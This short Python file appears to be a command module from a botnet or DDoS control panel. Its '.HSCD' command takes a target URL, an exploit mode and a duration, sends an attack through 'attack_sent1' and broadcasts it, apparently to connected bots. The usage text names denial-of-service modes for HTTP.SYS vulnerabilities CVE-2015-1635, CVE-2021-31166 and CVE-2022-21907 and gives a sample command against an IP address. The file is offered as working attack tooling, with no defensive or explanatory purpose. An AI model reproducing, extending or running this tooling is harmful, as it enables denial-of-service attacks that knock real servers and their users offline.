from colorama import Fore

def HSCD(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        mode = args[2]
        secs = args[3]
        if validate_time(secs):
            send(client, ansi_clear, False)
            attack_sent1(ip, mode, secs, client)
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
    else:
        send(client, 'Usage: .HSCD [URL] [MODE] [TIME]')
        send(client, 'THIS METHODS USE CVE HTTP.SYS (DOS)')
        send(client, 'MODE --> 2015_1635_1-6 for CVE-2015-1635 ')
        send(client, '     --> 2021_31166    for CVE-2021-31166')
        send(client, '     --> 2022_21907    for CVE-2022-21907')
        send(client, '     --> HTTP.SYS      for dos vuln all')
        send(client, 'WHY NAME HSCD BECAUSE ITS HTTP.SYS CVE DOS (METHODS)')
        send(client, 'EXAMPLE command: -> .HSCD http://1.1.1.1 2015_1635_6 10')